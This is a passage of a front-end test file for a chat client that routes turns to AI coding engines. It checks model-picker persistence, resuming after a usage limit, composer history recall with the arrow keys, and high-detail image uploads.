  expect(within(screen.getByTestId("model-picker")).getByText("Opus")).toBeTruthy();
  expect(localStorage.getItem("optchat:model")).toBe("claude-code:opus");
  type("still on opus");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ forwardedProps: { engine: "claude-code:opus" } });
});

test("before the first state, a message names the model this page kept; once the state shows the chain lacks it, the chain's first", async () => {
  localStorage.setItem("optchat:model", "openai-plan:gpt-6.1-sol");
  const { play, server } = start(LOG, 0, undefined, true);
  await screen.findByText("what is in the repo?");
  type("right after a reload");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ forwardedProps: { engine: "openai-plan:gpt-6.1-sol" } });
  play({ snapshot: { ...IDLE, engines: [{ down: null, label: "Claude Opus (Claude Code)", ref: "claude-code:opus" }] }, type: EventType.STATE_SNAPSHOT });
  expect(within(screen.getByTestId("model-picker")).getByText("Opus")).toBeTruthy();
  type("after the state");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ forwardedProps: { engine: "claude-code:opus" } });
});

test("a turn stopped on a usage limit: every client shows why and the engines to go on with; a button resumes, and the picker follows it", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  play(
    state({
      engines: [
        { down: "Claude AI usage limit reached", label: "Claude Opus (Claude Code)", ref: "claude-code:opus" },
        { down: null, label: "GPT-6.1 Sol (ChatGPT plan)", ref: "openai-plan:gpt-6.1-sol" },
      ],
      phase: "needs-model",
      stopped: { label: "Claude Opus (Claude Code)", ref: "claude-code:opus", why: "usage limit: Claude AI usage limit reached" },
    }),
  );
  // the run's end that follows is not said again in the chat: the prompt says it, once
  play({ message: "usage limit: Claude AI usage limit reached", type: EventType.RUN_ERROR });
  const alert = await screen.findByTestId("needs-model");
  expect(alert.textContent).toContain("Claude Opus (Claude Code): usage limit: Claude AI usage limit reached. Choose how to go on:");
  expect(screen.queryByTestId("marker-error")).toBeNull();
  // a message sent while it waits meets the turn as a running one would: it joins once the turn
  // goes on, or (the other button) waits for the next turn
  expect(box().getAttribute("placeholder")).toBe("Add to the turn, once it goes on");
  type("meanwhile");
  expect(screen.getByRole("button", { name: "Queue for the next turn" })).toBeTruthy();
  expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy();
  type("");
  expect(screen.queryByTestId("status")).toBeNull();
  // moving the picker resumes nothing
  const before = server.sent.length;
  fireEvent.change(screen.getByLabelText("Model"), { target: { value: "openai-plan:gpt-6.1-sol" } });
  fireEvent.change(screen.getByLabelText("Model"), { target: { value: "claude-code:opus" } });
  expect(server.sent).toHaveLength(before);
  fireEvent.click(within(alert).getByRole("button", { name: "Continue with GPT-6.1 Sol (ChatGPT plan)" }));
  expect(frames(server.sent).at(-1)).toEqual({ engine: "openai-plan:gpt-6.1-sol", type: "resume" });
  expect(within(screen.getByTestId("model-picker")).getByText("GPT-6.1 Sol")).toBeTruthy();
  fireEvent.click(within(alert).getByRole("button", { name: "Try Claude Opus (Claude Code) again" }));
  expect(frames(server.sent).at(-1)).toEqual({ engine: "claude-code:opus", type: "resume" });
});

test("on a keyboard, Up in an empty composer recalls this client's sent messages, Down goes back; edited, it stays", async () => {
  start();
  await screen.findByText("what is in the repo?");
  for (const t of ["first", "second"]) {
    type(t);
    fireEvent.keyDown(box(), { key: "Enter" });
  }
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("second");
  box().setSelectionRange(0, 0);
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("first");
  box().setSelectionRange(5, 5);
  fireEvent.keyDown(box(), { key: "ArrowDown" });
  expect(box().value).toBe("second");
  box().setSelectionRange(6, 6);
  fireEvent.keyDown(box(), { key: "ArrowDown" });
  expect(box().value).toBe("");
  type("my own");
  fireEvent.keyDown(box(), { key: "ArrowUp" });
  expect(box().value).toBe("my own");
  expect(screen.getByTestId("composer-hint").textContent).toContain("↑ last message");
});

test("a photo can go up at high detail: it is uploaded again with ?detail=high, and send waits for it, saying why", async () => {
  const uploads = fakeUploads();
  start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  expect(screen.getByTestId("composer-hint").textContent).toBe("waiting for 1 upload…");
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(true);
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
  });
  const hd = screen.getByRole("button", { name: "High detail for board.png" });
  expect(hd.getAttribute("aria-pressed")).toBe("false");
  fireEvent.click(hd);
  await waitFor(() => {
    expect(uploads.started.map((u) => u.detail)).toEqual(["standard", "high"]);
  });
  expect(screen.getByRole("button", { name: "High detail for board.png" }).getAttribute("aria-pressed")).toBe("true");
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(true);
  await act(async () => {
    uploads.started[1]?.finish(SHA("e"));
  });
  expect(screen.getByRole("button", { name: "Send" }).hasAttribute("disabled")).toBe(false);
});
